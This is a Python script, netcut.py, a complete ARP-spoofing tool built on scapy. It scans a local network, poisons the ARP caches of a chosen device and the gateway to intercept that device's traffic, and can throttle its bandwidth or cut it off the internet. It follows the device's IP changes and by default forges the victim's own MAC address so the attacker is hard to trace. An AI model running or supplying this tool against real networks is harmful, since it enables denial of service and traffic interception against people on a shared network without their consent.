#!/usr/bin/env python3

import os
import sys
import time
import signal
import threading
import subprocess
import argparse
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, conf


# ─── Network helpers ─────────────────────────────────────────────────────────

def get_default_iface():
    out = subprocess.check_output(['ip', 'route', 'show', 'default']).decode()
    parts = out.split()
    return parts[parts.index('dev') + 1]


def get_gateway_ip():
    out = subprocess.check_output(['ip', 'route', 'show', 'default']).decode()
    return out.split()[2]


def get_mac(ip, iface):
    """Resolve IP to MAC via ARP request. Returns None on failure."""
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip)
    answered, _ = srp(pkt, timeout=2, iface=iface, verbose=0)
    if answered:
        return answered[0][1].hwsrc
    return None


def find_ip_for_mac(target_mac, network, iface):
    """
    Check local ARP cache for a quick initial lookup.
    Returns IP string or None — used only at startup.
    """
    target_mac = target_mac.lower()
    try:
        with open('/proc/net/arp') as f:
            for line in f.readlines()[1:]:
                parts = line.split()
                if len(parts) >= 4 and parts[3].lower() == target_mac:
                    return parts[0]
    except OSError:
        pass
    return None


def arp_scan(network, iface):
    """
    Broadcast ARP request over network range.
    network: CIDR string e.g. '192.168.1.0/24'
    Returns list of {'ip': ..., 'mac': ...}
    """
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=network)
    answered, _ = srp(pkt, timeout=3, iface=iface, verbose=0)
    return [{'ip': r[1].psrc, 'mac': r[1].hwsrc} for _, r in answered]


# ─── ARP spoofing ─────────────────────────────────────────────────────────────

def send_spoof(target_ip, target_mac, spoof_ip, iface, src_mac=None):
    """
    Send one fake ARP reply to target_ip saying spoof_ip is at our MAC.
    src_mac: if set, override Ethernet frame source so packets appear to
             originate from that MAC (ghost/stealth mode).
    """
    ether_kw = {'dst': target_mac}
    if src_mac:
        ether_kw['src'] = src_mac
    pkt = Ether(**ether_kw) / ARP(
        op=2,            # reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,   # lie: claim this IP belongs to us
    )
    sendp(pkt, iface=iface, verbose=0)


def send_restore(target_ip, target_mac, real_ip, real_mac, iface):
    """Send a correct ARP reply to undo poisoning."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=real_ip,
        hwsrc=real_mac,
    )
    sendp(pkt, iface=iface, count=5, verbose=0)


# ─── IP forwarding ────────────────────────────────────────────────────────────

def set_ip_forward(enable: bool):
    val = '1' if enable else '0'
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write(val)


# ─── Bandwidth control via tc (HTB) ──────────────────────────────────────────

def apply_bandwidth_limit(iface, target_ip, rate_kbps):
    """
    Use HTB qdisc to limit outgoing traffic destined for target_ip.
    rate_kbps: integer, kilobits per second (e.g. 512 = 512 kbps)

    tc hierarchy:
      root 1:  (HTB)
        1:10   default class  → full speed
        1:20   limited class  → rate_kbps
      filter: ip dst target_ip → 1:20
    """
    rate = f"{rate_kbps}kbit"

    # Remove any existing root qdisc first (ignore errors if none exists)
    subprocess.run(
        ['tc', 'qdisc', 'del', 'dev', iface, 'root'],
        capture_output=True
    )

    # Root HTB qdisc, default traffic goes to class 1:10
    subprocess.run([
        'tc', 'qdisc', 'add', 'dev', iface,
        'root', 'handle', '1:', 'htb', 'default', '10'
    ], check=True)

    # Class 1:10 — unlimited (everything else)
    subprocess.run([
        'tc', 'class', 'add', 'dev', iface,
        'parent', '1:', 'classid', '1:10',
        'htb', 'rate', '1000mbit'
    ], check=True)

    # Class 1:20 — rate limited (our target)
    subprocess.run([
        'tc', 'class', 'add', 'dev', iface,
        'parent', '1:', 'classid', '1:20',
        'htb', 'rate', rate, 'burst', '15k'
    ], check=True)

    # Filter: match packets with dst = target_ip → send to class 1:20
    subprocess.run([
        'tc', 'filter', 'add', 'dev', iface,
        'protocol', 'ip', 'parent', '1:0',
        'prio', '1', 'u32',
        'match', 'ip', 'dst', target_ip,
        'flowid', '1:20'
    ], check=True)

    print(f"[+] Bandwidth limited to {rate_kbps} kbps for {target_ip}")


def clear_bandwidth(iface):
    """Remove all tc qdiscs on the interface."""
    subprocess.run(
        ['tc', 'qdisc', 'del', 'dev', iface, 'root'],
        capture_output=True
    )
    print(f"[+] Bandwidth limits cleared on {iface}")


# ─── Main controller ──────────────────────────────────────────────────────────

class NetCut:
    def __init__(self, iface=None):
        self.iface      = iface or get_default_iface()
        self.gateway_ip = get_gateway_ip()
        self.gateway_mac = get_mac(self.gateway_ip, self.iface)
        self.my_mac      = get_if_hwaddr(self.iface)

        if not self.gateway_mac:
            sys.exit("[-] Could not resolve gateway MAC — check interface/network")

        print(f"[*] Interface : {self.iface}")
        print(f"[*] Gateway   : {self.gateway_ip}  ({self.gateway_mac})")
        print(f"[*] My MAC    : {self.my_mac}")

        # target_ip -> {'mac': str, 'active': bool, 'thread': Thread}
        self._targets = {}
        self._lock    = threading.Lock()

    # ── Scan ──────────────────────────────────────────────────────────────────

    def scan(self, network=None):
        if not network:
            prefix = '.'.join(self.gateway_ip.split('.')[:3])
            network = f"{prefix}.0/24"
        print(f"[*] Scanning {network} ...")
        devices = arp_scan(network, self.iface)
        print(f"[+] {len(devices)} host(s) found:\n")
        print(f"  {'IP':<18} MAC")
        print(f"  {'-'*18} {'-'*17}")
        for d in devices:
            marker = ' ← gateway' if d['ip'] == self.gateway_ip else ''
            print(f"  {d['ip']:<18} {d['mac']}{marker}")
        print()
        return devices

    # ── Spoof loop ────────────────────────────────────────────────────────────

    def _spoof_loop(self, target_ip, target_mac, src_mac=None):
        while self._targets.get(target_ip, {}).get('active'):
            # Tell target: gateway's IP is at MY mac
            send_spoof(target_ip, target_mac, self.gateway_ip, self.iface, src_mac=src_mac)
            # Tell gateway: target's IP is at MY mac
            send_spoof(self.gateway_ip, self.gateway_mac, target_ip, self.iface, src_mac=src_mac)
            time.sleep(1.5)

    # ── Cut / uncut ───────────────────────────────────────────────────────────

    def cut(self, target_ip, rate_kbps=None, src_mac=None, src_ip=None, no_ghost=False):
        """
        MITM a target. Optionally cap their bandwidth to rate_kbps.

        Ghost mode (default ON): ARP poison packets appear to originate from
        the victim itself. Pass no_ghost=True to use our real MAC instead.
        src_mac / src_ip override the ghost identity with custom values.
        """
        if target_ip in self._targets:
            print(f"[!] Already targeting {target_ip}")
            return

        mac = get_mac(target_ip, self.iface)
        if not mac:
            print(f"[-] Could not resolve MAC for {target_ip}")
            return

        # Resolve ghost source MAC
        if no_ghost:
            ghost_mac = None
        elif src_mac:
            ghost_mac = src_mac
        else:
            ghost_mac = mac   # default: impersonate victim's own MAC

        if ghost_mac:
            ghost_ip = src_ip or target_ip
            print(f"[*] Ghost mode  : ON  (src MAC={ghost_mac}  src IP={ghost_ip})")
        else:
            print(f"[*] Ghost mode  : OFF (using our real MAC)")

        set_ip_forward(True)

        with self._lock:
            self._targets[target_ip] = {'mac': mac, 'active': True}

        t = threading.Thread(
            target=self._spoof_loop,
            args=(target_ip, mac, ghost_mac),
            daemon=True,
            name=f"spoof-{target_ip}"
        )
        t.start()
        self._targets[target_ip]['thread'] = t

        print(f"[+] Intercepting {target_ip} ({mac})")

        if rate_kbps is not None:
            apply_bandwidth_limit(self.iface, target_ip, rate_kbps)

    def uncut(self, target_ip):
        """Stop intercepting and restore correct ARP on both sides."""
        if target_ip not in self._targets:
            print(f"[-] {target_ip} is not a current target")
            return

        with self._lock:
            self._targets[target_ip]['active'] = False

        mac = self._targets[target_ip]['mac']

        # Restore target's view of gateway
        send_restore(target_ip, mac, self.gateway_ip, self.gateway_mac, self.iface)
        # Restore gateway's view of target
        send_restore(self.gateway_ip, self.gateway_mac, target_ip, mac, self.iface)

        clear_bandwidth(self.iface)
        del self._targets[target_ip]
        print(f"[+] ARP restored for {target_ip}")

    def list_targets(self):
        if not self._targets:
            print("[*] No active targets")
            return
        print(f"\n  {'IP':<18} MAC")
        for ip, info in self._targets.items():
            print(f"  {ip:<18} {info['mac']}")
        print()

    # ── MAC-based cut with auto IP tracking ──────────────────────────────────

    def cut_by_mac(self, target_mac, network=None, rescan_secs=120,
                   src_mac=None, src_ip=None, no_ghost=False):
        """
        Cut internet for a device identified by MAC address.
        - Scans to find its current IP.
        - Sends ARP poison WITHOUT ip_forward so traffic is dropped (not forwarded).
        - Every rescan_secs, re-scans to detect IP changes and re-applies.

        Ghost mode (default ON): ARP poison Ethernet frames appear to originate
        from the victim's own MAC. src_mac / src_ip override with custom values.
        """
        if not network:
            prefix = '.'.join(self.gateway_ip.split('.')[:3])
            network = f"{prefix}.0/24"

        # Normalize MAC to colon format regardless of what was passed
        target_mac = target_mac.lower().replace('-', ':').replace('.', ':')

        # Resolve ghost source MAC
        if no_ghost:
            ghost_mac = None
        elif src_mac:
            ghost_mac = src_mac.lower().replace('-', ':').replace('.', ':')
        else:
            ghost_mac = target_mac   # default: impersonate victim's own MAC

        state = {'ip': None, 'running': True}

        def _probe():
            """Send a broadcast ARP request to force the target to reveal its IP."""
            pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=network)
            answered, _ = srp(pkt, iface=self.iface, timeout=3, verbose=0)
            for _, rcv in answered:
                if rcv[Ether].src.lower() == target_mac:
                    return rcv[ARP].psrc
            return None

        def _poison_loop():
            while state['running']:
                ip = state['ip']
                if ip:
                    ghost_ip = src_ip or ip

                    # Tell target: gateway IP is at OUR MAC → target sends to us
                    ether_to_victim = {'dst': target_mac}
                    if ghost_mac:
                        ether_to_victim['src'] = ghost_mac
                    sendp(Ether(**ether_to_victim) / ARP(
                        op=2,
                        pdst=ip,
                        hwdst=target_mac,
                        psrc=self.gateway_ip,
                        hwsrc=self.my_mac,
                    ), iface=self.iface, verbose=0)

                    # Tell gateway: target IP is at OUR MAC → gateway sends to us
                    ether_to_gw = {'dst': self.gateway_mac}
                    if ghost_mac:
                        ether_to_gw['src'] = ghost_mac
                    sendp(Ether(**ether_to_gw) / ARP(
                        op=2,
                        pdst=self.gateway_ip,
                        hwdst=self.gateway_mac,
                        psrc=ghost_ip,
                        hwsrc=self.my_mac,
                    ), iface=self.iface, verbose=0)

                    print(f"[>] Cut {ip} — traffic redirected to us, dropped (no forward)")
                time.sleep(5)

        def _on_arp(pkt):
            """Update IP whenever target MAC is seen in any ARP packet."""
            if not state['running']:
                return
            src_mac = pkt[Ether].src.lower()
            if src_mac == target_mac:
                new_ip = pkt[ARP].psrc
                if new_ip != state['ip']:
                    print(f"[+] IP {'changed' if state['ip'] else 'detected'}: "
                          f"{state['ip']} → {new_ip}")
                    state['ip'] = new_ip

        def _track_loop():
            from scapy.all import sniff
            # Try ARP cache first
            ip = find_ip_for_mac(target_mac, network, self.iface)
            if ip:
                print(f"[+] IP from ARP cache: {ip}")
                state['ip'] = ip
            else:
                # Active probe to force target to announce itself
                print(f"[*] Probing network for {target_mac} ...")
                ip = _probe()
                if ip:
                    print(f"[+] IP found: {ip}")
                    state['ip'] = ip
                else:
                    print(f"[-] Target not responding — waiting for ARP traffic ...")

            print(f"[*] Sniffing ARP on {self.iface} for IP changes ...")
            while state['running']:
                sniff(
                    iface=self.iface,
                    filter="arp",
                    prn=_on_arp,
                    timeout=30,
                    store=False,
                )

        # ip_forward stays OFF so poisoned traffic is dropped, not forwarded
        set_ip_forward(False)

        threading.Thread(target=_poison_loop, daemon=True, name=f"poison-{target_mac}").start()
        threading.Thread(target=_track_loop,  daemon=True, name=f"track-{target_mac}").start()

        if ghost_mac:
            ghost_ip_display = src_ip or '(victim IP)'
            print(f"[*] Ghost mode  : ON  (src MAC={ghost_mac}  src IP={ghost_ip_display})")
        else:
            print(f"[*] Ghost mode  : OFF (using our real MAC)")
        print(f"[+] MAC-cut active for {target_mac}  (rescan every {rescan_secs}s)")
        print("[*] Press Ctrl+C to stop\n")

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            state['running'] = False
            print("\n[!] Stopped MAC-cut.")

    def cleanup(self):
        print("\n[*] Restoring all targets and cleaning up ...")
        for ip in list(self._targets.keys()):
            self.uncut(ip)
        clear_bandwidth(self.iface)
        set_ip_forward(False)


# ─── CLI ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description='netcut.py — ARP spoof + bandwidth control (run as root on Linux)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 netcut.py scan
  sudo python3 netcut.py scan 10.0.0.0/24
  sudo python3 netcut.py cut 192.168.1.50
  sudo python3 netcut.py cut 192.168.1.50 --rate 256
  sudo python3 netcut.py cut 192.168.1.50 --src-mac de:ad:be:ef:00:01 --src-ip 192.168.1.50
  sudo python3 netcut.py cut 192.168.1.50 --no-ghost
  sudo python3 netcut.py restore 192.168.1.50
  sudo python3 netcut.py cut-mac aa:bb:cc:dd:ee:ff
  sudo python3 netcut.py cut-mac aa:bb:cc:dd:ee:ff --src-mac de:ad:be:ef:00:01
  sudo python3 netcut.py cut-mac aa:bb:cc:dd:ee:ff --no-ghost
        """
    )
    parser.add_argument('-i', '--iface', help='Network interface (default: auto-detect)')
    sub = parser.add_subparsers(dest='cmd', metavar='command')

    # scan
    p_scan = sub.add_parser('scan', help='Discover devices on the LAN')
    p_scan.add_argument('network', nargs='?', help='CIDR range (default: auto from gateway)')

    # cut
    p_cut = sub.add_parser('cut', help='Intercept a target (MITM via ARP spoof)')
    p_cut.add_argument('target', help='Target IP address')
    p_cut.add_argument('-r', '--rate', type=int, metavar='KBPS',
                       help='Bandwidth cap in kbps (omit = no limit)')
    p_cut.add_argument('--src-mac', metavar='MAC',
                       help='Ghost source MAC for ARP packets (default: victim\'s MAC)')
    p_cut.add_argument('--src-ip', metavar='IP',
                       help='Ghost source IP identity to display (default: victim\'s IP)')
    p_cut.add_argument('--no-ghost', action='store_true',
                       help='Disable ghost mode — use our real MAC as ARP source')

    # restore
    p_res = sub.add_parser('restore', help='Stop intercepting and restore ARP')
    p_res.add_argument('target', help='Target IP address')

    # cut-mac
    p_mac = sub.add_parser('cut-mac', help='Cut internet for a device by MAC address')
    p_mac.add_argument('mac', help='Target MAC address (e.g. aa:bb:cc:dd:ee:ff)')
    p_mac.add_argument('-n', '--network', help='CIDR to scan (default: auto from gateway)')
    p_mac.add_argument('-r', '--rescan', type=int, default=120, metavar='SECS',
                       help='Re-scan interval in seconds (default: 120)')
    p_mac.add_argument('--src-mac', metavar='MAC',
                       help='Ghost source MAC for ARP packets (default: victim\'s MAC)')
    p_mac.add_argument('--src-ip', metavar='IP',
                       help='Ghost source IP identity (default: victim\'s IP)')
    p_mac.add_argument('--no-ghost', action='store_true',
                       help='Disable ghost mode — use our real MAC as ARP source')

    args = parser.parse_args()

    if not args.cmd:
        parser.print_help()
        sys.exit(0)

    if os.geteuid() != 0:
        sys.exit("[-] Must run as root (sudo)")

    nc = NetCut(iface=args.iface)

    def _sig(sig, frame):
        nc.cleanup()
        sys.exit(0)

    signal.signal(signal.SIGINT, _sig)
    signal.signal(signal.SIGTERM, _sig)

    if args.cmd == 'scan':
        nc.scan(args.network)

    elif args.cmd == 'cut':
        nc.cut(args.target, rate_kbps=args.rate,
               src_mac=args.src_mac, src_ip=args.src_ip, no_ghost=args.no_ghost)
        print("[*] Running — press Ctrl+C to stop and restore ARP\n")
        signal.pause()   # wait for SIGINT/SIGTERM

    elif args.cmd == 'restore':
        nc.uncut(args.target)

    elif args.cmd == 'cut-mac':
        nc.cut_by_mac(args.mac, network=args.network, rescan_secs=args.rescan,
                      src_mac=args.src_mac, src_ip=args.src_ip, no_ghost=args.no_ghost)


if __name__ == '__main__':
    main()
